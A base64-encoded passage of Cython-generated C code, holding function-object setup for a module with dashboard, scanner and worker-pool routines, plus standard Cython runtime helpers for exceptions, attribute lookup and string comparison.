FfZF8xXzNhdlhRZTFfZkcxX1FfUWZIQVVfNHZYLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE2XSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCA0MjUsIDk3fTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGZ9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTddID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3RmX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jcmVhdGVfZGFzaGJvYXJkLCBfX3B5eF9rX0FfUWFfUV9rX1RfUWlxX1Ffa180XzFLcV9RX2tfZF9hLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE3XSkpIGdvdG8gYmFkOwogIH0KICB7CiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDEwLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNDM1LCAyMTl9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZXhlY3V0b3IsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1dHVyZV90b193b3JrZXIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3dvcmtlcl9pZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYWN0aXZlX3dvcmtlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1dHVyZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfd2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mdXR1cmV9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMThdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3RmX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9hZHZhbmNlZF9zY2FubmVyLCBfX3B5eF9rX0FfRl8xX3FfSEFfcV9kX1NfMUFfMV8xX2FfUV9xX3EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMThdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDQ2OSwgOTV9OwogICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxOV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdGZfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3J1biwgX19weXhfa19BX05fSVVfMl9BUV9LdUFSXzBfMlYzal9EX0EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTldKSkgZ290byBiYWQ7CiAgfQogIFB5X0RFQ1JFRih0dXBsZV9kZWR1cF9tYXApOwogIHJldHVybiAwOwogIGJhZDoKICBQeV9ERUNSRUYodHVwbGVfZGVkdXBfbWFwKTsKICByZXR1cm4gLTE7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X0luaXRHbG9iYWxzKHZvaWQpIHsKICAKICBpZiAobGlrZWx5KF9fUHl4X2luaXRfY29fdmFyaWFibGVzKCkgPT0gMCkpOyBlbHNlCgppZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKewogICAgUHlPYmplY3QgKnR5cGVzTW9kdWxlPU5VTEw7CiAgICB0eXBlc01vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgidHlwZXMiKTsKICAgIGlmICh0eXBlc01vZHVsZSkgewogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0NhY2hlZE1ldGhvZFR5cGUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKHR5cGVzTW9kdWxlLCAiTWV0aG9kVHlwZSIpOwogICAgICAgIFB5X0RFQ1JFRih0eXBlc01vZHVsZSk7CiAgICB9Cn0gLy8gZXJyb3IgaGFuZGxpbmcgZm9sbG93cwojZW5kaWYKCmlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQoKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgcmV0dXJuIC0xOwp9CgoKCgojaWZkZWYgX01TQ19WRVIKI3ByYWdtYSB3YXJuaW5nKCBwdXNoICkKCiNwcmFnbWEgd2FybmluZyggZGlzYWJsZSA6IDQxMjcgKQojZW5kaWYKCgoKCgoKCiNpZiBDWVRIT05fUkVGTkFOTlkKc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueUltcG9ydEFQSShjb25zdCBjaGFyICptb2RuYW1lKSB7CiAgICBQeU9iamVjdCAqbSA9IE5VTEwsICpwID0gTlVMTDsKICAgIHZvaWQgKnIgPSBOVUxMOwogICAgbSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZShtb2RuYW1lKTsKICAgIGlmICghbSkgZ290byBlbmQ7CiAgICBwID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhtLCAiUmVmTmFubnlBUEkiKTsKICAgIGlmICghcCkgZ290byBlbmQ7CiAgICByID0gUHlMb25nX0FzVm9pZFB0cihwKTsKZW5kOgogICAgUHlfWERFQ1JFRihwKTsKICAgIFB5X1hERUNSRUYobSk7CiAgICByZXR1cm4gKF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICopcjsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCnN0YXRpYyBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc1R1cGxlKFB5T2JqZWN0ICpleGNfdHlwZSwgUHlPYmplY3QgKnR1cGxlKSB7CiAgICBQeV9zc2l6ZV90IGksIG47CiAgICBuID0gUHlUdXBsZV9HRVRfU0laRSh0dXBsZSk7CiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHsKICAgICAgICBpZiAoZXhjX3R5cGUgPT0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpIHJldHVybiAxOwogICAgfQogICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7CiAgICAgICAgaWYgKF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpKSByZXR1cm4gMTsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShQeVRocmVhZFN0YXRlKiB0c3RhdGUsIFB5T2JqZWN0KiBlcnIpIHsKICAgIGludCByZXN1bHQ7CiAgICBQeU9iamVjdCAqZXhjX3R5cGU7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE2CiAgICBQeU9iamVjdCAqY3VycmVudF9leGNlcHRpb24gPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uOwogICAgaWYgKHVubGlrZWx5KCFjdXJyZW50X2V4Y2VwdGlvbikpIHJldHVybiAwOwogICAgZXhjX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGN1cnJlbnRfZXhjZXB0aW9uKTsKICAgIGlmIChleGNfdHlwZSA9PSBlcnIpIHJldHVybiAxOwojZWxzZQogICAgZXhjX3R5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlOwogICAgaWYgKGV4Y190eXBlID09IGVycikgcmV0dXJuIDE7CiAgICBpZiAodW5saWtlbHkoIWV4Y190eXBlKSkgcmV0dXJuIDA7CiNlbmRpZgogICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBQeV9JTkNSRUYoZXhjX3R5cGUpOwogICAgI2VuZGlmCiAgICBpZiAodW5saWtlbHkoUHlUdXBsZV9DaGVjayhlcnIpKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNUdXBsZShleGNfdHlwZSwgZXJyKTsKICAgIH0gZWxzZSB7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBlcnIpOwogICAgfQogICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBQeV9ERUNSRUYoZXhjX3R5cGUpOwogICAgI2VuZGlmCiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICp0eXBlLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICp0YikgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgogICAgUHlPYmplY3QgKnRtcF92YWx1ZTsKICAgIGFzc2VydCh0eXBlID09IE5VTEwgfHwgKHZhbHVlICE9IE5VTEwgJiYgdHlwZSA9PSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKSkpOwogICAgaWYgKHZhbHVlKSB7CiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGlmICh1bmxpa2VseSgoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIHZhbHVlKS0+dHJhY2ViYWNrICE9IHRiKSkKICAgICAgICAjZW5kaWYKICAgICAgICAgICAgUHlFeGNlcHRpb25fU2V0VHJhY2ViYWNrKHZhbHVlLCB0Yik7CiAgICB9CiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uOwogICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IHZhbHVlOwogICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpOwogICAgUHlfWERFQ1JFRih0eXBlKTsKICAgIFB5X1hERUNSRUYodGIpOwojZWxzZQogICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiOwogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gdHlwZTsKICAgIHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlID0gdmFsdWU7CiAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSB0YjsKICAgIFB5X1hERUNSRUYodG1wX3R5cGUpOwogICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpOwogICAgUHlfWERFQ1JFRih0bXBfdGIpOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyckZldGNoSW5TdGF0ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNgogICAgUHlPYmplY3QqIGV4Y192YWx1ZTsKICAgIGV4Y192YWx1ZSA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247CiAgICB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID0gMDsKICAgICp2YWx1ZSA9IGV4Y192YWx1ZTsKICAgICp0eXBlID0gTlVMTDsKICAgICp0YiA9IE5VTEw7CiAgICBpZiAoZXhjX3ZhbHVlKSB7CiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7CiAgICAgICAgUHlfSU5DUkVGKCp0eXBlKTsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgKnRiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSBleGNfdmFsdWUpLT50cmFjZWJhY2s7CiAgICAgICAgUHlfWElOQ1JFRigqdGIpOwogICAgICAgICNlbHNlCiAgICAgICAgKnRiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y192YWx1ZSk7CiAgICAgICAgI2VuZGlmCiAgICB9CiNlbHNlCiAgICAqdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7CiAgICAqdmFsdWUgPSB0c3RhdGUtPmN1cmV4Y192YWx1ZTsKICAgICp0YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+Y3VyZXhjX3R5cGUgPSAwOwogICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSAwOwogICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gMDsKI2VuZGlmCn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKSB7CiAgICBQeVR5cGVPYmplY3QqIHRwID0gUHlfVFlQRShvYmopOwogICAgaWYgKGxpa2VseSh0cC0+dHBfZ2V0YXR0cm8pKQogICAgICAgIHJldHVybiB0cC0+dHBfZ2V0YXR0cm8ob2JqLCBhdHRyX25hbWUpOwogICAgcmV0dXJuIFB5T2JqZWN0X0dldEF0dHIob2JqLCBhdHRyX25hbWUpOwp9CiNlbmRpZgoKCiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMApzdGF0aWMgdm9pZCBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyX0NsZWFyQXR0cmlidXRlRXJyb3Iodm9pZCkgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgaWYgKGxpa2VseShfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkpCiAgICAgICAgX19QeXhfUHlFcnJfQ2xlYXIoKTsKfQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgICh2b2lkKSBQeU9iamVjdF9HZXRPcHRpb25hbEF0dHIob2JqLCBhdHRyX25hbWUsICZyZXN1bHQpOwogICAgcmV0dXJuIHJlc3VsdDsKI2Vsc2UKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgIFB5VHlwZU9iamVjdCogdHAgPSBQeV9UWVBFKG9iaik7CiAgICBpZiAobGlrZWx5KHRwLT50cF9nZXRhdHRybyA9PSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHsKICAgICAgICByZXR1cm4gX1B5T2JqZWN0X0dlbmVyaWNHZXRBdHRyV2l0aERpY3Qob2JqLCBhdHRyX25hbWUsIE5VTEwsIDEpOwogICAgfQojZW5kaWYKICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBhdHRyX25hbWUpOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7CiAgICAgICAgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cl9DbGVhckF0dHJpYnV0ZUVycm9yKCk7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0OwojZW5kaWYKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5hbWUoUHlPYmplY3QgKm5hbWUpIHsKICAgIFB5T2JqZWN0KiByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9iLCBuYW1lKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiAhUHlFcnJfT2NjdXJyZWQoKSkgewogICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19OYW1lRXJyb3IsCiAgICAgICAgICAgICJuYW1lICclVScgaXMgbm90IGRlZmluZWQiLCBuYW1lKTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0KCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTApzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqCl9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pCnsKICAgIFB5T2JqZWN0ICpyZXM7CiAgICBQeV9zc2l6ZV90IGk7CiAgICBpZiAobiA8PSAwKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSk7CiAgICB9CiAgICByZXMgPSBQeVR1cGxlX05ldyhuKTsKICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMOwogICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKHJlcywgaSwgc3JjW2ldKSA8ICgwKSkpIHsKICAgICAgICAgICAgUHlfREVDUkVGKHJlcyk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBQeV9JTkNSRUYoc3JjW2ldKTsKICAgIH0KICAgIHJldHVybiByZXM7Cn0KI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfY29weV9vYmplY3RfYXJyYXkoUHlPYmplY3QgKmNvbnN0ICpDWVRIT05fUkVTVFJJQ1Qgc3JjLCBQeU9iamVjdCoqIENZVEhPTl9SRVNUUklDVCBkZXN0LCBQeV9zc2l6ZV90IGxlbmd0aCkgewogICAgUHlPYmplY3QgKnY7CiAgICBQeV9zc2l6ZV90IGk7CiAgICBmb3IgKGkgPSAwOyBpIDwgbGVuZ3RoOyBpKyspIHsKICAgICAgICB2ID0gZGVzdFtpXSA9IHNyY1tpXTsKICAgICAgICBQeV9JTkNSRUYodik7CiAgICB9Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKgpfX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKQp7CiAgICBQeU9iamVjdCAqcmVzOwogICAgaWYgKG4gPD0gMCkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUpOwogICAgfQogICAgcmVzID0gUHlUdXBsZV9OZXcobik7CiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDsKICAgIF9fUHl4X2NvcHlfb2JqZWN0X2FycmF5KHNyYywgKChQeVR1cGxlT2JqZWN0KilyZXMpLT5vYl9pdGVtLCBuKTsKICAgIHJldHVybiByZXM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKgpfX1B5eF9QeUxpc3RfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pCnsKICAgIFB5T2JqZWN0ICpyZXM7CiAgICBpZiAobiA8PSAwKSB7CiAgICAgICAgcmV0dXJuIFB5TGlzdF9OZXcoMCk7CiAgICB9CiAgICByZXMgPSBQeUxpc3RfTmV3KG4pOwogICAgaWYgKHVubGlrZWx5KHJlcyA9PSBOVUxMKSkgcmV0dXJuIE5VTEw7CiAgICBfX1B5eF9jb3B5X29iamVjdF9hcnJheShzcmMsICgoUHlMaXN0T2JqZWN0KilyZXMpLT5vYl9pdGVtLCBuKTsKICAgIHJldHVybiByZXM7Cn0KI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5Qnl0ZXNfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIHx8XAogICAgICAgICEoQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUykKICAgIHJldHVybiBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woczEsIHMyLCBlcXVhbHMpOwojZWxzZQogICAgaWYgKHMxID09IHMyKSB7CiAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpOwogICAgfSBlbHNlIGlmIChQeUJ5dGVzX0NoZWNrRXhhY3QoczEpICYgUHlCeXRlc19DaGVja0V4YWN0KHMyKSkgewogICAgICAgIGNvbnN0IGNoYXIgKnBzMSwgKnBzMjsKICAgICAgICBQeV9zc2l6ZV90IGxlbmd0aCA9IFB5Qnl0ZXNfR0VUX1NJWkUoczEpOwogICAgICAgIGlmIChsZW5ndGggIT0gUHlCeXRlc19HRVRfU0laRShzMikpCiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTsKICAgICAgICBwczEgPSBQeUJ5dGVzX0FTX1NUUklORyhzMSk7CiAgICAgICAgcHMyID0gUHlCeXRlc19BU19TVFJJTkcoczIpOwogICAgICAgIGlmIChwczFbMF0gIT0gcHMyWzBdKSB7CiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTsKICAgICAgICB9IGVsc2UgaWYgKGxlbmd0aCA9PSAxKSB7CiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpbnQgcmVzdWx0OwojaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAmJiAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEIwMDAwKQogICAgICAgICAgICBQeV9oYXNoX3QgaGFzaDEsIGhhc2gyOwogICAgICAgICAgICBoYXNoMSA9ICgoUHlCeXRlc09iamVjdCopczEpLT5vYl9zaGFzaDsKICAgICAgICAgICAgaGFzaDIgPSAoKFB5Qnl0ZXNPYmplY3QqKXMyKS0+b2Jfc2hhc2g7CiAgICAgICAgICAgIGlmIChoYXNoMSAhPSBoYXNoMiAmJiBoYXNoMSAhPSAtMSAmJiBoYXNoMiAhPSAtMSkgewogICAgICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpOwogICAgICAgICAgICB9CiNlbmRpZgogICAgICAgICAgICByZXN1bHQgPSBtZW1jbXAocHMxLCBwczIsIChzaXplX3QpbGVuZ3RoKTsKICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpID8gKHJlc3VsdCA9PSAwKSA6IChyZXN1bHQgIT0gMCk7CiAgICAgICAgfQogICAgfSBlbHNlIGlmICgoczEgPT0gUHlfTm9uZSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczIpKSB7CiAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpOwogICAgfSBlbHNlIGlmICgoczIgPT0gUHlfTm9uZSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczEpKSB7CiAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpOwogICAgfSBlbHNlIHsKICAgICAgICBpbnQgcmVzdWx0OwogICAgICAgIFB5T2JqZWN0KiBweV9yZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShzMSwgczIsIGVxdWFscyk7CiAgICAgICAgaWYgKCFweV9yZXN1bHQpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfcmVzdWx0KTsKICAgICAgICBQeV9ERUNSRUYocHlfcmVzdWx0KTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZW5kaWYKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKFB5T2JqZWN0KiBzMSwgUHlPYmplY3QqIHMyLCBpbnQgZXF1YWxzKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMCiAgICByZXR1cm4gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHMxLCBzMiwgZXF1YWxzKTsKI2Vsc2UKICAgIGludCBzMV9pc191bmljb2RlLCBzMl9pc191bmljb2RlOwogICAgaWYgKHMxID09IHMyKSB7CiAgICAgICAgZ290byByZXR1cm5fZXE7CiAgICB9CiAgICBzMV9pc191bmljb2RlID0gUHlVbmljb2RlX0NoZWNrRXhhY3QoczEpOwogICAgczJfaXNfdW5pY29kZSA9IFB5VW5pY29kZV9DaGVja0V4YWN0KHMyKTsKICAgIGlmIChzMV9pc191bmljb2RlICYgczJfaXNfdW5pY29kZSkgewogICAgICAgIFB5X3NzaXplX3QgbGVuZ3RoLCBsZW5ndGgyOwogICAgICAgIGludCBraW5kOwogICAgICAgIHZvaWQgKmRhdGExLCAqZGF0YTI7CiAgICAgICAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShzMSkgPCAwKSB8fCB1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkoczIpIDwgMCkpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAjZW5kaWYKICAgICAgICBsZW5ndGggPSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChzMSk7CiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIGlmICh1bmxpa2VseShsZW5ndGggPCAwKSkgcmV0dXJuIC0xOwogICAgICAgICNlbmRpZgogICAgICAgIGxlbmd0aDIgPSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChzMik7CiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIGlmICh1bmxpa2VseShsZW5ndGgyIDwgMCkpIH